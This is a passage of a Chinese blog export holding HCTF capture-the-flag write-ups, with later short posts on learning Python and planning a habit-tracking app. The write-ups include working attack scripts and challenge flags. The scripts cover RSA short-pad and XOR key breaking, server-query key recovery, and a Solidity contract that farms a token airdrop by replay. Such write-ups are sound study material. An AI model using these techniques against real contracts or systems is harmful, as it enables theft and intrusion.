class=\"keyword\">in</span> range(len(oricipher)):</span><br><span class=\"line\">\t\tresult += abs(pow(float(oricipher[i])-float(tempcipher[i]),<span class=\"number\">2</span>))</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> result</span><br><span class=\"line\"></span><br><span class=\"line\">myresult1 = []</span><br><span class=\"line\">myresult2 = []</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(<span class=\"number\">96</span>):</span><br><span class=\"line\">\tsumzerodst = <span class=\"number\">0.0</span></span><br><span class=\"line\">\tsumonedst = <span class=\"number\">0.0</span></span><br><span class=\"line\">\tmindst = <span class=\"number\">1.0</span></span><br><span class=\"line\">\tminchr = <span class=\"number\">-1</span></span><br><span class=\"line\">\t<span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> range(len(orilist)):</span><br><span class=\"line\">\t\tkey = orilist[j][:i] + [<span class=\"number\">0</span>] + orilist[j][i+<span class=\"number\">1</span>:]</span><br><span class=\"line\">\t\tf = urlopen(url + <span class=\"string\">'msg='</span> + msg + <span class=\"string\">'&amp;'</span> + <span class=\"string\">'key='</span> + list2str(key))</span><br><span class=\"line\">\t\tmylist = json.loads(f.read())</span><br><span class=\"line\">\t\ttempcipher = mylist[<span class=\"string\">'raw_cipher'</span>].split(<span class=\"string\">','</span>)</span><br><span class=\"line\">\t\tdst = getdst(tempcipher,oricipher)</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> dst &lt; mindst:</span><br><span class=\"line\">\t\t\tmindst = dst</span><br><span class=\"line\">\t\t\tminchr = <span class=\"number\">0</span></span><br><span class=\"line\">\t\tsumzerodst += dst</span><br><span class=\"line\">\t\tkey = orilist[j][:i] + [<span class=\"number\">1</span>] + orilist[j][i+<span class=\"number\">1</span>:]</span><br><span class=\"line\">\t\tf = urlopen(url + <span class=\"string\">'msg='</span> + msg + <span class=\"string\">'&amp;'</span> + <span class=\"string\">'key='</span> + list2str(key))</span><br><span class=\"line\">\t\tmylist = json.loads(f.read())</span><br><span class=\"line\">\t\ttempcipher = mylist[<span class=\"string\">'raw_cipher'</span>].split(<span class=\"string\">','</span>)</span><br><span class=\"line\">\t\tdst = getdst(tempcipher,oricipher)</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> dst &lt; mindst:</span><br><span class=\"line\">\t\t\tmindst = dst</span><br><span class=\"line\">\t\t\tminchr = <span class=\"number\">1</span></span><br><span class=\"line\">\t\tsumonedst += dst</span><br><span class=\"line\">\tmyresult1.append(minchr)</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> sumonedst &gt; sumzerodst :</span><br><span class=\"line\">\t\tmyresult2.append(<span class=\"number\">0</span>)</span><br><span class=\"line\">\t<span class=\"keyword\">else</span> :</span><br><span class=\"line\">\t\tmyresult2.append(<span class=\"number\">1</span>)</span><br><span class=\"line\"><span class=\"keyword\">print</span> <span class=\"string\">\"======myresult======\"</span></span><br><span class=\"line\"><span class=\"keyword\">print</span> myresult1</span><br><span class=\"line\"><span class=\"keyword\">print</span> myresult2</span><br><span class=\"line\"><span class=\"keyword\">print</span> <span class=\"string\">\"======myresult======\"</span></span><br><span class=\"line\"></span><br><span class=\"line\">f = urlopen(url + <span class=\"string\">'msg='</span> + msg + <span class=\"string\">'&amp;'</span> + <span class=\"string\">'key='</span> + list2str(myresult1))</span><br><span class=\"line\">mylist = json.loads(f.read())</span><br><span class=\"line\">mycipher1 = mylist[<span class=\"string\">'raw_cipher'</span>].split(<span class=\"string\">','</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">f = urlopen(url + <span class=\"string\">'msg='</span> + msg + <span class=\"string\">'&amp;'</span> + <span class=\"string\">'key='</span> + list2str(myresult2))</span><br><span class=\"line\">mylist = json.loads(f.read())</span><br><span class=\"line\">mycipher2 = mylist[<span class=\"string\">'raw_cipher'</span>].split(<span class=\"string\">','</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">print</span> getdst(mycipher1,oricipher)</span><br><span class=\"line\"><span class=\"keyword\">print</span> getdst(mycipher2,oricipher)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> mycipher1 == oricipher:</span><br><span class=\"line\">\t<span class=\"keyword\">print</span> <span class=\"string\">\"mycipher1\"</span></span><br><span class=\"line\"><span class=\"keyword\">if</span> mycipher2 == oricipher:</span><br><span class=\"line\">\t<span class=\"keyword\">print</span> <span class=\"string\">\"mycipher2\"</span></span><br></pre></td></tr></table></figure></p>\n<p>最开始我预设的orilist二维数组是[[1,0]<em>48,[0,1]</em>48,[1,1,0,0]<em>24,[0,0,1,1]</em>24],之后把距离结果空间向量更近的myresult作为新的key替换掉其中原本的key，一步一步缩小dst从而获得key的</p>\n<h3 id=\"easy-dump\"><a href=\"#easy-dump\" class=\"headerlink\" title=\"easy dump\"></a>easy dump</h3><p>Volatility + GIMP，可以查看内存里的内容，内存中有很多扫雷和写字板：i am boring真是服气2333<br>在文件大概3/4的位置，可以看到flag在画图里<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">hctf&#123;big_brother_is_watching_you&#125;</span><br></pre></td></tr></table></figure></p>\n<h3 id=\"difficult-programming-language\"><a href=\"#difficult-programming-language\" class=\"headerlink\" title=\"difficult programming language\"></a>difficult programming language</h3><p>给了键盘流量包，可以使用一航师傅的脚本直接得到键盘输入的内容。【\\&lt;GA>是～`】<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">D&apos;`;M?!\\mZ4j8hgSvt2bN);^]+7jiE3Ve0A@Q=|;)sxwYXtsl2pongOe+LKa&apos;e^]\\a`_X|V[Tx;&quot;VONSRQJn1MFKJCBfFE&gt;&amp;&lt;`@9!=&lt;5Y9y7654-,P0/o-,%I)ih&amp;%$#z@xw|&#123;ts9wvXWm3~</span><br></pre></td></tr></table></figure></p>\n<p>题目名称叫difficult programming language，google了一下什么破语言长这个样子。。<br><code>Malbolge.</code><br>网上找到运行工具 <a href=\"https://zb3.me/malbolge-tools/#interpreter\" target=\"_blank\" rel=\"noopener\">https://zb3.me/malbolge-tools/#interpreter</a><br>发现这个字符串里还有输错的一个字符。<br>经另一个工具的调试，可以得知是一个:写成了”号，解得flag<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">hctf&#123;m4lb0lGe&#125;</span><br></pre></td></tr></table></figure></p>\n<h3 id=\"Questionnaire\"><a href=\"#Questionnaire\" class=\"headerlink\" title=\"Questionnaire\"></a>Questionnaire</h3><p>谢谢杭电的师傅带来的题目们！</p>\n<h2 id=\"crypto\"><a href=\"#crypto\" class=\"headerlink\" title=\"crypto\"></a>crypto</h2><h3 id=\"xor-rsa\"><a href=\"#xor-rsa\" class=\"headerlink\" title=\"xor?rsa\"></a>xor?rsa</h3><p>这题目去网上找了一个Coppersmith’s Short Pad Attack的脚本解就完事了(代码是sage的)。做的时候有时候会出bug我猜是因为程序只考虑了m1 &lt; m2的情况<br><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">short_pad_attack</span><span class=\"params\">(c1, c2, e, n)</span>:</span></span><br><span class=\"line\">    PRxy.&lt;x,y&gt; = PolynomialRing(Zmod(n))</span><br><span class=\"line\">    PRx.&lt;xn&gt; = PolynomialRing(Zmod(n))</span><br><span class=\"line\">    PRZZ.&lt;xz,yz&gt; = PolynomialRing(Zmod(n))</span><br><span class=\"line\"></span><br><span class=\"line\">    g1 = x^e - c1</span><br><span class=\"line\">    g2 = (x+y)^e - c2</span><br><span class=\"line\"></span><br><span class=\"line\">    q1 = g1.change_ring(PRZZ)</span><br><span class=\"line\">    q2 = g2.change_ring(PRZZ)</span><br><span class=\"line\"></span><br><span class=\"line\">    h = q2.resultant(q1)</span><br><span class=\"line\">    h = h.univariate_polynomial()</span><br><span class=\"line\">    h = h.change_ring(PRx).subs(y=xn)</span><br><span class=\"line\">    h = h.monic()</span><br><span class=\"line\"></span><br><span class=\"line\">    kbits = n.nbits()//(<span class=\"number\">2</span>*e*e)</span><br><span class=\"line\">    diff = h.small_roots(X=<span class=\"number\">2</span>^kbits, beta=<span class=\"number\">0.5</span>)[<span class=\"number\">0</span>]  <span class=\"comment\"># find root &lt; 2^kbits with factor &gt;= n^0.5</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">return</span> diff</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">related_message_attack</span><span class=\"params\">(c1, c2, diff, e, n)</span>:</span></span><br><span class=\"line\">    PRx.&lt;x&gt; = PolynomialRing(Zmod(n))</span><br><span class=\"line\">    g1 = x^e - c1</span><br><span class=\"line\">    g2 = (x+diff)^e - c2</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">gcd</span><span class=\"params\">(g1, g2)</span>:</span></span><br><span class=\"line\">        <span class=\"keyword\">while</span> g2:</span><br><span class=\"line\">            g1, g2 = g2, g1 % g2</span><br><span class=\"line\">        <span class=\"keyword\">return</span> g1.monic()</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">return</span> -gcd(g1, g2)[<span class=\"number\">0</span>]</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">'__main__'</span>:</span><br><span class=\"line\">    n= <span class=\"number\">27624787021478794432014046099044118472227462806689571877169321162341080400196594346396848700712193861439412465401252070834347447700123908992634057384897412386580543011772079685187452484482547314927927429951393092826148514141421284117787379461959985518410275689835704614842539327338694334290636840780333631465334614621493439746492265763855548204271205728089432042119353912134654280030097883942195750158943707581611175683875993347872617178472015419336030838097558714715441536192198290146161340547436590517299418585354071449344756659404775888056026765078595754225196944721648716610489001136659404706431278525745515104917</span></span><br><span class=\"line\">    c1= <span class=\"number\">13776430024099427642531911099839128926564176154051949185623735493234122290060192171769692779077048350629609066059365476450358845203910684337231957918278447357520403549804467122983129527704870697355281794028641080624088689157548661997693776511974828120568864171878093764082280753662161625828078814197217819685649535298124739243813838247280440444870641299263032971398100048924255763139678843914805922076507098230791386720957494918572285270985306870181291182419426387424133256438320963476729846690659232164905237954666457813107525668584308246667410713493861547967072360028087639069471098558962062807871564380753429263871</span></span><br><span class=\"line\">    c2= <span class=\"number\">657231109479430507699610101563647841801217640396116098068091897995892991211353444343972272978841494609004887673387698097902809034155415900362766044097098144261124986944336934366572328336651114328263543752730621658631527529933155522273669604895074397446129985885649878307733042032148247389310416198437240727964021932669979819481020837218701471923646557509580811764880281874944153918428434725834087434372596746861333346978776952856870040789444689376922826142208442257560964199238714914125845958146653319252684895614435672435449705706009355823637834574529488498832642357882290037365904913250435342395978044581644541358</span></span><br><span class=\"line\">    e = <span class=\"number\">5</span></span><br><span class=\"line\"></span><br><span class=\"line\">    diff = short_pad_attack(c1, c2, e, n)</span><br><span class=\"line\">    <span class=\"keyword\">print</span> <span class=\"string\">\"difference of two messages is %d\"</span> % diff</span><br><span class=\"line\"></span><br><span class=\"line\">    m1 = related_message_attack(c1, c2, diff, e, n)</span><br><span class=\"line\">    m2 = m1 + diff</span><br><span class=\"line\">    <span class=\"keyword\">print</span> <span class=\"string\">\"------\"</span></span><br><span class=\"line\">    <span class=\"keyword\">print</span> m1</span><br><span class=\"line\">    <span class=\"keyword\">print</span> <span class=\"string\">\"------\"</span></span><br><span class=\"line\">    <span class=\"keyword\">print</span> pow(m1,e,n)</span><br><span class=\"line\">    <span class=\"keyword\">print</span> c1</span><br><span class=\"line\">    <span class=\"keyword\">print</span> <span class=\"string\">\"------\"</span></span><br><span class=\"line\">    <span class=\"keyword\">print</span> m2</span><br><span class=\"line\">    <span class=\"keyword\">print</span> <span class=\"string\">\"------\"</span></span><br><span class=\"line\">    <span class=\"keyword\">print</span> pow(m2,e,n)</span><br><span class=\"line\">    <span class=\"keyword\">print</span> c2</span><br></pre></td></tr></table></figure></p>\n<h3 id=\"xor-game\"><a href=\"#xor-game\" class=\"headerlink\" title=\"xor game\"></a>xor game</h3><p><a href=\"https://www.anquanke.com/post/id/161171#h2-0\" target=\"_blank\" rel=\"noopener\">参考</a><br>原理是汉明码，脚本如下:<br><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> base64</span><br><span class=\"line\"><span class=\"keyword\">import</span> string</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">bxor</span><span class=\"params\">(a, b)</span>:</span>     <span class=\"comment\"># xor two byte strings of different lengths</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> len(a) &gt; len(b):</span><br><span class=\"line\">        <span class=\"keyword\">return</span> bytes([x ^ y <span class=\"keyword\">for</span> x, y <span class=\"keyword\">in</span> zip(a[:len(b)], b)])</span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> bytes([x ^ y <span class=\"keyword\">for</span> x, y <span class=\"keyword\">in</span> zip(a, b[:len(a)])])</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">hamming_distance</span><span class=\"params\">(b1, b2)</span>:</span></span><br><span class=\"line\">    differing_bits = <span class=\"number\">0</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> byte <span class=\"keyword\">in</span> bxor(b1, b2):</span><br><span class=\"line\">        differing_bits += bin(byte).count(<span class=\"string\">\"1\"</span>)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> differing_bits</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">break_single_key_xor</span><span class=\"params\">(text)</span>:</span></span><br><span class=\"line\">    key = <span class=\"number\">0</span></span><br><span class=\"line\">    possible_space = <span class=\"number\">0</span></span><br><span class=\"line\">    max_possible = <span class=\"number\">0</span></span><br><span class=\"line\">    letters = string.ascii_letters.encode(<span class=\"string\">'ascii'</span>)</span><br><span class=\"line\">    <span class=\"keyword\">for</span> a <span class=\"keyword\">in</span> range(<span class=\"number\">0</span>, len(text)):</span><br><span class=\"line\">        maxpossible = <span class=\"number\">0</span></span><br><span class=\"line\">        <span class=\"keyword\">for</span> b <span class=\"keyword\">in</span> range(<span class=\"number\">0</span>, len(text)):</span><br><span class=\"line\">            <span class=\"keyword\">if</span>(a == b):</span><br><span class=\"line\">                <span class=\"keyword\">continue</span></span><br><span class=\"line\">            c = text[a] ^ text[b]</span><br><span class=\"line\">            <span class=\"keyword\">if</span> c <span class=\"keyword\">not</span> <span class=\"keyword\">in</span> letters <span class=\"keyword\">and</span> c != <span class=\"number\">0</span>:</span><br><span class=\"line\">                <span class=\"keyword\">continue</span></span><br><span class=\"line\">            maxpossible += <span class=\"number\">1</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> maxpossible &gt; max_possible:</span><br><span class=\"line\">            max_possible = maxpossible</span><br><span class=\"line\">            possible_space = a</span><br><span class=\"line\">    key = text[possible_space] ^ <span class=\"number\">0x20</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> chr(key)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">text = <span class=\"string\">''</span></span><br><span class=\"line\"><span class=\"keyword\">with</span> open(<span class=\"string\">'cipher.txt'</span>, <span class=\"string\">'r'</span>) <span class=\"keyword\">as</span> f:</span><br><span class=\"line\">    <span class=\"keyword\">for</span> line <span class=\"keyword\">in</span> f:</span><br><span class=\"line\">        text += line</span><br><span class=\"line\">b = base64.b64decode(text)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">normalized_distances = []</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> KEYSIZE <span class=\"keyword\">in</span> range(<span class=\"number\">2</span>, <span class=\"number\">40</span>):</span><br><span class=\"line\">    b1 = b[: KEYSIZE]</span><br><span class=\"line\">    b2 = b[KEYSIZE: KEYSIZE * <span class=\"number\">2</span>]</span><br><span class=\"line\">    b3 = b[KEYSIZE * <span class=\"number\">2</span>: KEYSIZE * <span class=\"number\">3</span>]</span><br><span class=\"line\">    b4 = b[KEYSIZE * <span class=\"number\">3</span>: KEYSIZE * <span class=\"number\">4</span>]</span><br><span class=\"line\">    b5 = b[KEYSIZE * <span class=\"number\">4</span>: KEYSIZE * <span class=\"number\">5</span>]</span><br><span class=\"line\">    b6 = b[KEYSIZE * <span class=\"number\">5</span>: KEYSIZE * <span class=\"number\">6</span>]</span><br><span class=\"line\"></span><br><span class=\"line\">    normalized_distance = float(</span><br><span class=\"line\">        hamming_distance(b1, b2) +</span><br><span class=\"line\">        hamming_distance(b2, b3) +</span><br><span class=\"line\">        hamming_distance(b3, b4) +</span><br><span class=\"line\">        hamming_distance(b4, b5) +</span><br><span class=\"line\">        hamming_distance(b5, b6)</span><br><span class=\"line\">    ) / (KEYSIZE * <span class=\"number\">5</span>)</span><br><span class=\"line\">    normalized_distances.append(</span><br><span class=\"line\">        (KEYSIZE, normalized_distance)</span><br><span class=\"line\">    )</span><br><span class=\"line\">normalized_distances = sorted(normalized_distances, key=<span class=\"keyword\">lambda</span> x: x[<span class=\"number\">1</span>])</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> KEYSIZE, _ <span class=\"keyword\">in</span> normalized_distances[:<span class=\"number\">5</span>]:</span><br><span class=\"line\">    block_bytes = [[] <span class=\"keyword\">for</span> _ <span class=\"keyword\">in</span> range(KEYSIZE)]</span><br><span class=\"line\">    <span class=\"keyword\">for</span> i, byte <span class=\"keyword\">in</span> enumerate(b):</span><br><span class=\"line\">        block_bytes[i % KEYSIZE].append(byte)</span><br><span class=\"line\">    keys = <span class=\"string\">''</span></span><br><span class=\"line\">    <span class=\"keyword\">try</span>:</span><br><span class=\"line\">        <span class=\"keyword\">for</span> bbytes <span class=\"keyword\">in</span> block_bytes:</span><br><span class=\"line\">            keys += break_single_key_xor(bbytes)</span><br><span class=\"line\">        key = bytearray(keys * len(b), <span class=\"string\">\"utf-8\"</span>)</span><br><span class=\"line\">        plaintext = bxor(b, key)</span><br><span class=\"line\">        print(<span class=\"string\">\"keysize:\"</span>, KEYSIZE)</span><br><span class=\"line\">        print(<span class=\"string\">\"key is:\"</span>, keys, <span class=\"string\">\"n\"</span>)</span><br><span class=\"line\">        s = bytes.decode(plaintext)</span><br><span class=\"line\">        print(s)</span><br><span class=\"line\">    <span class=\"keyword\">except</span> Exception:</span><br><span class=\"line\">        <span class=\"keyword\">continue</span></span><br></pre></td></tr></table></figure></p>\n<p>最后的结果:<br>flag:<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">## blockchain</span><br><span class=\"line\"></span><br><span class=\"line\">### bet2loss</span><br><span class=\"line\"></span><br><span class=\"line\">一血！是个dice2win早期版本+erc20的题目，开奖函数可以重放，但是没看出来通过哪一步的重放能获得token。</span><br><span class=\"line\">每个账号会空投1000 token，只需要一万个账号就可以拿到flag。遂发动薅羊毛攻击。还是很慢，希望下次换个链哈哈哈。</span><br></pre></td></tr></table></figure></p>\n<p>pragma solidity ^0.4.20;<br>contract Attack_7878678 {<br>//    address[] private son_list;</p>\n<pre><code>function Attack_7878678() payable {}\n\nfunction attack_starta(uint256 reveal_num) public {\n    for(int i=0;i&lt;=50;i++){\n        son = new Son(reveal_num);\n    }\n}\n\nfunction () payable {\n}\n</code></pre><p>}</p>\n<p>contract Son_7878678 {</p>\n<pre><code>function Son_7878678(uint256 reveal_num) payable {\n    address game = 0x006b9bc418e43e92cf8d380c56b8d4be41fda319;\n    game.call(bytes4(keccak256(&quot;settleBet(uint256)&quot;)),reveal_num);\n    game.call(bytes4(keccak256(&quot;transfer(address,uint256)&quot;)),0x5FA2c80DB001f970cFDd388143b887091Bf85e77,950);\n}\nfunction () payable{\n}\n</code></pre><p>}<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure></p>\n<p>hctf{Ohhhh_r3p1ay_a77ack_f0r_c0n7r4ct}<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">### ez2win</span><br></pre></td></tr></table></figure></p>\n<p>_transfer(address from, address to, uint256 amount);<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">未设置权限，可以随便转。开源了以后很简单就能拿到flag。</span><br></pre></td></tr></table></figure></p>\n<p>hctf{0hhhh_m4k3_5ur3_y0ur_acc35s_c0n7r01}<br><code>`</code></p>"},{"title":"python入门的文档总结","date":"2019-03-26T01:53:14.000Z","_content":"\n总结了一些给想学习python的小朋友从哪里开始的内容，也可以来我的小店咨询我哈哈。\n\n<!-- more -->\n\n\n- 廖雪峰的python教程 https://www.liaoxuefeng.com/wiki/0014316089557264a6b348958f449949df42a6d3a2e542c000\n- python避免安装各种包的麻烦，使用Anaconda\n- pypi 找各种包\n- 多写代码哈哈，写写爬虫和模拟请求，刷一点oj\n\n\n\n","source":"_posts/get-startted-with-python.md","raw":"---\ntitle: python入门的文档总结\ndate: 2019-03-26 09:53:14\ntags:\n- python\n- 淘宝店\n---\n\n总结了一些给想学习python的小朋友从哪里开始的内容，也可以来我的小店咨询我哈哈。\n\n<!-- more -->\n\n\n- 廖雪峰的python教程 https://www.liaoxuefeng.com/wiki/0014316089557264a6b348958f449949df42a6d3a2e542c000\n- python避免安装各种包的麻烦，使用Anaconda\n- pypi 找各种包\n- 多写代码哈哈，写写爬虫和模拟请求，刷一点oj\n\n\n\n","slug":"get-startted-with-python","published":1,"updated":"2020-02-19T12:02:49.848Z","_id":"ck6rlh7u3001d21vwcshe5e70","comments":1,"layout":"post","photos":[],"link":"","content":"<p>总结了一些给想学习python的小朋友从哪里开始的内容，也可以来我的小店咨询我哈哈。</p>\n<a id=\"more\"></a>\n<ul>\n<li>廖雪峰的python教程 <a href=\"https://www.liaoxuefeng.com/wiki/0014316089557264a6b348958f449949df42a6d3a2e542c000\" target=\"_blank\" rel=\"noopener\">https://www.liaoxuefeng.com/wiki/0014316089557264a6b348958f449949df42a6d3a2e542c000</a></li>\n<li>python避免安装各种包的麻烦，使用Anaconda</li>\n<li>pypi 找各种包</li>\n<li>多写代码哈哈，写写爬虫和模拟请求，刷一点oj</li>\n</ul>\n","site":{"data":{}},"excerpt":"<p>总结了一些给想学习python的小朋友从哪里开始的内容，也可以来我的小店咨询我哈哈。</p>","more":"<ul>\n<li>廖雪峰的python教程 <a href=\"https://www.liaoxuefeng.com/wiki/0014316089557264a6b348958f449949df42a6d3a2e542c000\" target=\"_blank\" rel=\"noopener\">https://www.liaoxuefeng.com/wiki/0014316089557264a6b348958f449949df42a6d3a2e542c000</a></li>\n<li>python避免安装各种包的麻烦，使用Anaconda</li>\n<li>pypi 找各种包</li>\n<li>多写代码哈哈，写写爬虫和模拟请求，刷一点oj</li>\n</ul>"},{"title":"【研发】天天种树小程序 1 起步+调研","date":"2019-03-20T17:18:58.000Z","_content":"看了一段时间的前端知识，想写点什么东西练练手，正好之前和我家小朋友聊到了有个强定制的打卡种树app的需求，趁着现在不是很忙【其实事情还挺多的】，一起完整的做个产品练练手。\n\n<!-- more -->\n\n## 已有工具调研\n\n### 小日常\n\n我们想要做一个，强调圈子的打卡app，强调**一起**努力养成好习惯的过程。市面上已有的产品我们都去看了看，发现最好用的个人打卡app叫，小日常。\n\n![](https://md.byr.moe/uploads/upload_732eee40e1b03bd6c78aa330d55b0dc1.png)\n\n![](https://md.byr.moe/uploads/upload_fbea1c119a252f0bdac5c4e024ebace3.png)\n\n几乎满足了 个人打卡养成习惯的所有需求，我实在想不出来还可以添加什么功能，或是删除什么功能了。。推荐有需要的同学试用一下，google play和app store都有上架。\n\n### 有圈子的打卡工具\n\n我们需要的是有一个圈子，强调共同进步打卡。于是又在app商城和小程序列表里找了找，试用了其他的打卡工具。发现也有强调社交的打卡软件，但是就非常杂乱，比如\n\n- 内嵌了社区\n- UI设计的十分垃圾。。我找不到咋打卡。。\n- 圈子定制性不够强，所有人只能从同一天开始，共同完成一个任务。\n\n没办法了，作为程序员只能自己写了哈哈哈\n\n---\n\n## 头脑风暴\n\n### 打卡部分\n\n![](https://md.byr.moe/uploads/upload_a2b74b37618c03b610f5c5240e446513.png)\n\n说来惭愧，准备直接看看小日常有什么功能，删减删减。。我觉得人家做的挺好的。。\n\n当然还想考虑一下，日常任务/周常任务/每周哪几天做，哪几个任务设计方式更好。\n\n仅包含打卡的话，能够给予用户的正反馈大概有如下几点：\n\n- 打卡后的交互：数字增加、好的动画\n- 完成所有的任务给予奖励：卡片\n- 累计多长时间后有特殊提示，或者临近的count down\n\n### 